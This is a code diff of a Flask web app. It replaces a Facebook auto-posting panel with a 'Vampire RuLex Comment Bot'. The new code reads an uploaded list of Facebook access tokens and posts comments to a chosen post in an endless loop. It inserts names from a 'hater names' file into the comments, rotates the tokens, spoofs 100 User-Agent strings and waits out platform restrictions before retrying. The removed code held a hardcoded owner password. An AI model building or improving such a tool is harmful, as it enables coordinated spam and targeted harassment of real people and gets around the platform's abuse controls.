@@ -1,467 +1,255 @@
-from flask import Flask, request, jsonify, redirect, url_for, render_template_string
-import threading, time, requests, os
+from flask import Flask, request
+import requests
+from threading import Thread, Event
+import time
+import random
+import logging
 
 app = Flask(__name__)
-app.secret_key = "super_secret_key"
+app.debug = True
 
-# Memory store
-tasks = {}    # {task_key: True/False}
-logs = {}     # {task_key: [log_lines]}
-owner_logged_in = False
-OWNER_PASSWORD = "rowedyking"
+# List of 100 unique User-Agent strings
+user_agents = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
+    "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59",
+    "Mozilla/5.0 (Linux; Android 10; Pixel 4 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Mobile Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0",
+    "Mozilla/5.0 (Linux; Android 9; Mi A3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36",
+    "Mozilla/5.0 (iPad; CPU OS 13_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; OnePlus 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_5_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Linux; Android 10; SM-A505F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
+    "Mozilla/5.0 (Linux; Android 11; Redmi Note 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/92.0.902.73",
+    "Mozilla/5.0 (iPad; CPU OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Linux; Android 10; VIVO V19) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Mobile Safari/537.36",
+    "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; Galaxy S21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Mobile Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_6_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Linux; Android 10; Nokia 7.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Mobile Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; rv:90.0) Gecko/20100101 Firefox/90.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15",
+    "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Mobile Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/93.0.961.47",
+    "Mozilla/5.0 (iPad; CPU OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Linux; Android 10; Realme 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Mobile Safari/537.36",
+    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; Moto G Power) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Mobile Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_3_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Linux; Android 10; Oppo Reno3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Mobile Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15",
+    "Mozilla/5.0 (Linux; Android 11; Galaxy A71) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/94.0.992.50",
+    "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Linux; Android 10; Xiaomi Mi 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Mobile Safari/537.36",
+    "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; Vivo Y70s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.115 Mobile Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_4_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Linux; Android 10; Sony Xperia 1 II) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Mobile Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.2 Safari/605.1.15",
+    "Mozilla/5.0 (Linux; Android 11; Galaxy S20 FE) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Mobile Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/96.0.1054.43",
+    "Mozilla/5.0 (iPad; CPU OS 14_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Linux; Android 10; Oppo Reno4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
+    "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; Vivo V21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Mobile Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_6_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Linux; Android 10; Huawei P40) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15",
+    "Mozilla/5.0 (Linux; Android 11; Galaxy Z Fold2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/95.0.1020.30",
+    "Mozilla/5.0 (iPad; CPU OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Linux; Android 10; Realme X2 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36",
+    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; Nokia 5.4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_5_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Linux; Android 10; Sony Xperia 5 II) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.115 Mobile Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
+    "Mozilla/5.0 (Linux; Android 11; Galaxy S21 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Mobile Safari/537.36"
+]
 
-# ==================== HTML ====================
-HTML_PAGE = """ 
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook Multi-Token Auto Poster</title>
-    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700&family=Rajdhani:wght@400;500;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <style>
-        :root {
-            --bg-dark: #0d0d12;
-            --bg-darker: #07070a;
-            --accent: #ff2a6d;
-            --accent-dark: #d1004d;
-            --text: #e0e0e8;
-            --text-dim: #a0a0b0;
-            --card-bg: #151520;
-            --card-border: #252535;
-            --input-bg: #1a1a2a;
-        }
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-        }
+# Headers for Facebook Graph API
+headers = {
+    'Connection': 'keep-alive',
+    'Cache-Control': 'max-age=0',
+    'Upgrade-Insecure-Requests': '1',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+    'Accept-Encoding': 'gzip, deflate',
+    'Accept-Language': 'en-US,en;q=0.9',
+    'referer': 'www.google.com'
+}
+
+stop_event = Event()
+threads = []
+
+logging.basicConfig(filename='bot.log', level=logging.INFO)
+
+@app.route('/ping', methods=['GET'])
+def ping():
+    return "✅ I am alive!", 200
+
+def send_comments(access_tokens, post_id, prefix, time_interval, messages, hater_names):
+    while not stop_event.is_set():
+        try:
+            random.shuffle(messages)  # Randomize comments
+            random.shuffle(access_tokens)  # Rotate tokens
+            random.shuffle(hater_names)  # Randomize hater names
+            for message in messages:
+                if stop_event.is_set():
+                    break
+                for access_token in access_tokens:
+                    # Create a copy of headers and add a random User-Agent
+                    request_headers = headers.copy()
+                    request_headers['User-Agent'] = random.choice(user_agents)
+                    
+                    api_url = f'https://graph.facebook.com/v20.0/{post_id}/comments'
+                    # Select a random hater name
+                    hater_name = random.choice(hater_names) if hater_names else ""
+                    # Combine prefix, hater name, and message
+                    comment = f"{prefix} {hater_name} {message}" if prefix and hater_name else \
+                              f"{hater_name} {message}" if hater_name else \
+                              f"{prefix} {message}" if prefix else message
+                    parameters = {'access_token': access_token, 'message': comment}
+                    response = requests.post(api_url, data=parameters, headers=request_headers)
+                    if response.status_code == 200:
+                        logging.info(f"✅ Comment Sent: {comment[:30]} via {access_token[:10]}")
+                        print(f"✅ Comment Sent: {comment[:30]} via {access_token[:10]}")
+                    else:
+                        logging.error(f"❌ Fail [{response.status_code}]: {comment[:30]} - {response.text}")
+                        print(f"❌ Fail [{response.status_code}]: {comment[:30]} - {response.text}")
+                        if response.status_code in [400, 403]:
+                            logging.warning("⚠️ Rate limit or restriction detected. Waiting 5 minutes...")
+                            print("⚠️ Rate limit or restriction detected. Waiting 5 minutes...")
+                            time.sleep(300)
+                            continue
+                    time.sleep(max(time_interval, 120))  # Minimum 120-second delay
+        except Exception as e:
+            logging.error(f"⚠️ Error in comment loop: {e}")
+            print(f"⚠️ Error in comment loop: {e}")
+            time.sleep(60)
+
+@app.route('/', methods=['GET', 'POST'])
+def send_comment():
+    global threads
+    if request.method == 'POST':
+        token_file = request.files['tokenFile']
+        access_tokens = token_file.read().decode().strip().splitlines()
+        post_id = request.form.get('postId')
+        prefix = request.form.get('prefix')
+        time_interval = int(request.form.get('time'))
+        txt_file = request.files['txtFile']
+        messages = txt_file.read().decode().splitlines()
+        # Handle hater names file (optional)
+        hater_file = request.files.get('haterFile')
+        hater_names = hater_file.read().decode().strip().splitlines() if hater_file else []
+
+        if not any(thread.is_alive() for thread in threads):
+            stop_event.clear()
+            thread = Thread(target=send_comments, args=(access_tokens, post_id, prefix, time_interval, messages, hater_names))
+            thread.start()
+            threads = [thread]
+
+    return '''
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      <title>Vampire RuLex Comment Bot</title>
+      <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
+      <style>
+        label { color: white; }
+        .file { height: 30px; }
         body {
-            background-color: var(--bg-dark);
-            background-image:
-                radial-gradient(circle at 15% 50%, rgba(120, 20, 80, 0.2) 0%, transparent 25%),
-                radial-gradient(circle at 85% 30%, rgba(80, 20, 120, 0.2) 0%, transparent 25%),
-                radial-gradient(circle at 50% 80%, rgba(160, 30, 90, 0.2) 0%, transparent 25%);
-            color: var(--text);
-            font-family: 'Rajdhani', sans-serif;
-            margin: 0;
-            padding: 20px;
-            line-height: 1.6;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
+          background-image: url('https://i.postimg.cc/GpGTHHMj/2370de2b621af6e61d9117f31843df0c.jpg');
+          background-size: cover;
+          background-repeat: no-repeat;
+          color: white;
         }
         .container {
-            width: 100%;
-            max-width: 800px;
-            margin: 0 auto;
+          max-width: 350px;
+          height: 650px;
+          border-radius: 20px;
+          padding: 20px;
+          box-shadow: 0 0 15px white;
+          border: none;
         }
-        .header {
-            text-align: center;
-            margin-bottom: 30px;
-            padding: 20px;
-            position: relative;
+        .form-control {
+          border: 1px double white;
+          background: transparent;
+          width: 100%;
+          height: 40px;
+          padding: 7px;
+          margin-bottom: 20px;
+          border-radius: 10px;
+          color: white;
         }
-        .header h1 {
-            color: var(--accent);
-            margin: 0;
-            font-size: 3rem;
-            letter-spacing: 3px;
-            font-family: 'Orbitron', sans-serif;
-            font-weight: 700;
-            text-transform: uppercase;
-            text-shadow: 0 0 15px var(--accent);
-            position: relative;
-            display: inline-block;
-            padding: 0 20px;
-        }
-        .header h1::before,
-        .header h1::after {
-            content: '';
-            position: absolute;
-            top: 50%;
-            width: 30px;
-            height: 3px;
-            background: var(--accent);
-            box-shadow: 0 0 10px var(--accent);
-        }
-        .header h1::before { left: -40px; }
-        .header h1::after { right: -40px; }
-        .header p {
-            color: var(--text-dim);
-            margin: 10px 0 0;
-            font-size: 1.2rem;
-            letter-spacing: 2px;
-            font-weight: 500;
-        }
-        .panel {
-            background-color: rgba(21, 21, 32, 0.9);
-            border: 1px solid var(--card-border);
-            border-radius: 12px;
-            padding: 30px;
-            margin-bottom: 30px;
-            box-shadow: 0 0 30px rgba(255, 42, 109, 0.15);
-            backdrop-filter: blur(5px);
-            position: relative;
-            overflow: hidden;
-        }
-        .panel::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            height: 3px;
-            background: linear-gradient(to right, transparent, var(--accent), transparent);
-            box-shadow: 0 0 15px var(--accent);
-        }
-        .panel-title {
-            color: var(--accent);
-            margin-top: 0;
-            margin-bottom: 25px;
-            padding-bottom: 15px;
-            font-size: 1.8rem;
-            text-shadow: 0 0 5px var(--accent);
-            font-family: 'Orbitron', sans-serif;
-            letter-spacing: 1px;
-            text-align: center;
-            border-bottom: 1px solid var(--card-border);
-            position: relative;
-        }
-        .panel-title::after {
-            content: '';
-            position: absolute;
-            bottom: -2px;
-            left: 50%;
-            transform: translateX(-50%);
-            width: 100px;
-            height: 3px;
-            background: var(--accent);
-            box-shadow: 0 0 10px var(--accent);
-        }
-        .form-group {
-            margin-bottom: 25px;
-        }
-        label {
-            display: block;
-            margin-bottom: 10px;
-            color: var(--text-dim);
-            font-weight: 600;
-            font-size: 1.1rem;
-            letter-spacing: 0.5px;
-        }
-        input[type="text"],
-        input[type="number"],
-        input[type="file"],
-        input[type="password"],
-        select {
-            width: 100%;
-            padding: 14px 16px;
-            background-color: var(--input-bg);
-            border: 1px solid var(--card-border);
-            color: var(--text);
-            font-family: 'Rajdhani', sans-serif;
-            font-size: 1.1rem;
-            font-weight: 500;
-            border-radius: 6px;
-            transition: all 0.3s;
-        }
-        input:focus {
-            outline: none;
-            border-color: var(--accent);
-            box-shadow: 0 0 10px rgba(255, 42, 109, 0.3);
-        }
-        button, input[type="submit"] {
-            background: linear-gradient(135deg, var(--accent), var(--accent-dark));
-            color: white;
-            border: none;
-            padding: 16px 24px;
-            font-family: 'Orbitron', sans-serif;
-            font-weight: bold;
-            font-size: 1.2rem;
-            cursor: pointer;
-            width: 100%;
-            transition: all 0.3s;
-            border-radius: 6px;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-            box-shadow: 0 0 20px rgba(255, 42, 109, 0.3);
-            margin-bottom: 15px;
-            position: relative;
-            overflow: hidden;
-            z-index: 1;
-        }
-        button::before, input[type="submit"]::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
-            transition: all 0.5s;
-            z-index: -1;
-        }
-        button:hover, input[type="submit"]:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 0 25px rgba(255, 42, 109, 0.5);
-        }
-        button:hover::before, input[type="submit"]:hover::before {
-            left: 100%;
-        }
-        .threads-btn {
-            background: linear-gradient(135deg, #252540, #151530);
-        }
-        .threads-btn:hover {
-            background: linear-gradient(135deg, #353550, #252540);
-        }
-        .glow {
-            animation: glow 2s infinite alternate;
-        }
-        @keyframes glow {
-            from { text-shadow: 0 0 5px var(--accent); }
-            to { text-shadow: 0 0 15px var(--accent), 0 0 25px var(--accent-dark); }
-        }
-        .file-input-container {
-            position: relative;
-        }
-        .file-input-container::after {
-            content: 'Choose File';
-            position: absolute;
-            right: 10px;
-            top: 50%;
-            transform: translateY(-50%);
-            background: var(--accent);
-            color: white;
-            padding: 8px 15px;
-            border-radius: 4px;
-            font-size: 0.9rem;
-            font-weight: 600;
-            pointer-events: none;
-        }
-        input[type="file"] {
-            padding-right: 100px;
-        }
-        #console-box {
-            background-color: var(--input-bg);
-            border: 1px solid var(--card-border);
-            border-radius: 6px;
-            padding: 15px;
-            color: var(--text);
-            font-family: 'Rajdhani', sans-serif;
-            font-size: 1rem;
-            max-height: 200px;
-            overflow-y: auto;
-            margin-top: 20px;
-            white-space: pre-wrap;
-        }
-        @media (max-width: 768px) {
-            .header h1 { font-size: 2.2rem; }
-            .header h1::before, .header h1::after { display: none; }
-            .panel { padding: 20px; }
-        }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <div class="header">
-            <h1 class="glow">🩷 OWNER ROWEDY KIING 🩷</h1>
-            <p>Facebook Multi-Token Auto Poster</p>
-        </div>
+        .header { text-align: center; padding-bottom: 20px; }
+        .btn-submit { width: 100%; margin-top: 10px; }
+        .footer { text-align: center; margin-top 20px; color: #888; }
+      </style>
+    </head>
+    <body>
+      <header class="header mt-4">
+        <h1 class="mt-3">𝐕𝐀𝐌𝐏𝐈𝐑𝐄 𝐑𝐔𝐋𝐄𝐗</h1>
+ Þ     </header>
+      <div class="container text-center">
+        <form method="post" enctype="multipart/form-data">
+          <label>Token File</label><input type="file" name="tokenFile" class="form-control" required>
+          <label>Post ID</label><input type="text" name="postId" class="form-control" required>
+          <label>Comment Prefix (Optional)</label><input type="text" name="prefix" class="form-control">
+          <label>Delay (seconds)</label><input type="number" name="time" class="form-control" required>
+          <label>Comments File</label><input type="file" name="txtFile" class="form-control" required>
+          <label>Hater Names File (Optional)</label><input type="file" name="haterFile" class="form-control">
+          <button type="submit" class="btn btn-primary btn-submit">Start Commenting</button>
+        </form>
+        <form method="post" action="/stop">
+          <button type="submit" class="btn btn-danger btn-submit mt-3">Stop Commenting</button>
+        </form>
+      </div>
+      <footer class="footer">
+        <p>💀 Powered By Vampire Rulex</p>
+        <p>😈 Any One Cannot Beat Me</p>
+      </footer>
+    </body>
+    </html>
+    '''
 
-        {% if not owner %}
-        <div class="panel">
-            <h2 class="panel-title">Owner Login</h2>
-            <form method="post" action="/">
-                <div class="form-group">
-                    <label>Enter Owner Password:</label>
-                    <input type="password" name="owner_password" required placeholder="Enter password">
-                </div>
-                <input type="submit" value="Enter">
-            </form>
-        </div>
-        {% endif %}
+@app.route('/stop', methods=['POST'])
+def stop_sending():
+    stop_event.set()
+    return '✅ Commenting stopped.'
 
-        {% if owner %}
-        <div class="panel">
-            <h2 class="panel-title">🩷 OWNER KIING PANEL 🩷</h2>
-            <p>Active tasks: {{ tasks|length }}</p>
-            <form method="get" action="/logout">
-                <input type="submit" value="Logout" class="threads-btn">
-            </form>
-        </div>
-        {% endif %}
-
-        <div class="panel">
-            <h2 class="panel-title">Auto Poster Controls</h2>
-            <form method="post" enctype="multipart/form-data">
-                <div class="form-group">
-                    <label>Facebook Token (single) or leave empty for file:</label>
-                    <input type="text" name="token" placeholder="Enter single token">
-                </div>
-                <div class="form-group">
-                    <label>Upload Token File (.txt, one per line):</label>
-                    <div class="file-input-container">
-                        <input type="file" name="token_file" accept=".txt">
-                    </div>
-                </div>
-                <div class="form-group">
-                    <label>Delay between posts (seconds):</label>
-                    <input type="number" name="delay" value="60" min="1" required placeholder="Enter delay in seconds">
-                </div>
-                <div class="form-group">
-                    <label>Upload Messages File (.txt, one per line):</label>
-                    <div class="file-input-container">
-                        <input type="file" name="post_file" accept=".txt" required>
-                    </div>
-                </div>
-                <input type="submit" name="start_posting" value="Start Posting">
-            </form>
-        </div>
-
-        <div class="panel">
-            <h2 class="panel-title">Stop Posting</h2>
-            <form method="post">
-                <div class="form-group">
-                    <label>Enter Stop Key:</label>
-                    <input type="text" name="stop_key_input" required placeholder="Enter task key">
-                </div>
-                <input type="submit" name="stop_posting" value="Stop Posting">
-            </form>
-        </div>
-
-        <div class="panel">
-            <h2 class="panel-title">Logs</h2>
-            <div class="form-group">
-                <select id="task-select" onchange="changeTaskKey()">
-                    <option value="" disabled selected>Select Task</option>
-                    {% for k in tasks.keys() %}
-                    <option value="{{k}}">{{k}}</option>
-                    {% endfor %}
-                </select>
-            </div>
-            <div id="console-box">No logs yet...</div>
-        </div>
-    </div>
-
-    <script>
-        let currentTaskKey = '';
-        function changeTaskKey() {
-            const sel = document.getElementById('task-select');
-            currentTaskKey = sel.value;
-            fetchLogs();
-        }
-        async function fetchLogs() {
-            if (!currentTaskKey) {
-                document.getElementById('console-box').textContent = 'No task selected.';
-                return;
-            }
-            try {
-                const resp = await fetch('/logs?current_key=' + encodeURIComponent(currentTaskKey));
-                const data = await resp.json();
-                const box = document.getElementById('console-box');
-                box.textContent = data.logs.join('\\n');
-                box.scrollTop = box.scrollHeight;
-            } catch (e) {
-                console.error(e);
-            }
-        }
-        setInterval(fetchLogs, 2000);
-
-        // Add animation to inputs when focused
-        document.querySelectorAll('input, select').forEach(input => {
-            input.addEventListener('focus', function() {
-                this.parentElement.style.transform = 'translateY(-3px)';
-                this.parentElement.style.transition = 'transform 0.3s';
-            });
-            input.addEventListener('blur', function() {
-                this.parentElement.style.transform = 'translateY(0)';
-            });
-        });
-    </script>
-</body>
-</html>
-"""
-
-# ==================== AUTO POST FUNCTION ====================
-def auto_post(task_key, tokens, messages, delay):
-    logs[task_key] = []
-    logs[task_key].append(f"[Task {task_key}] Started with {len(tokens)} tokens, {len(messages)} messages.")
-    try:
-        i = 0
-        while task_key in tasks:
-            token = tokens[i % len(tokens)]
-            message = messages[i % len(messages)]
-
-            url = f"https://graph.facebook.com/me/feed"
-            params = {"message": message, "access_token": token}
-            r = requests.post(url, data=params)
-            if r.status_code == 200:
-                logs[task_key].append(f"[OK] Posted: {message[:30]}...")
-            else:
-                logs[task_key].append(f"[ERR] {r.text}")
-
-            i += 1
-            time.sleep(delay)
